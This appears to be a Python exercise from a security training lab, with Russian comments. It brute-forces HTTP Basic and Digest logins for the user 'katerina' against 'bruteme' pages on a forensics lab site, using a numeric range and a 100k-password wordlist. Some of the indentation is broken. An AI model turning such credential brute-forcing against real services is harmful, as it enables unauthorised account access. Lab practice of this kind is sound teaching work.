#5.1 Basic аутентификация 
#import requests
#from requests.auth import HTTPBasicAuth
#
#for i in range(100,999):
#    #session = requests.Session()
#    res=requests.get('https://labs.forensics.su/bruteme1.php', auth=HTTPBasicAuth('katerina', i))
#    print(res.status_code)
#    if res.status_code==200:
#    print (i, '=', res.text)

#5.2 Digest аутентификация 
        import requests
from requests.auth import HTTPDigestAuth
file= open('100k.txt','r', encoding='utf-8')
filepass = file.read().splitlines() # Разбивает строку на множество строк, возвращая их списком.
k=0
for i in filepass:
    k += 1
    res=requests.get('https://labs.forensics.su/bruteme2.php', auth=HTTPDigestAuth('katerina', i))
    print(k,res.status_code, '=', i)

    if res.status_code==200:
        print(res)
        exit(0)

file.close()
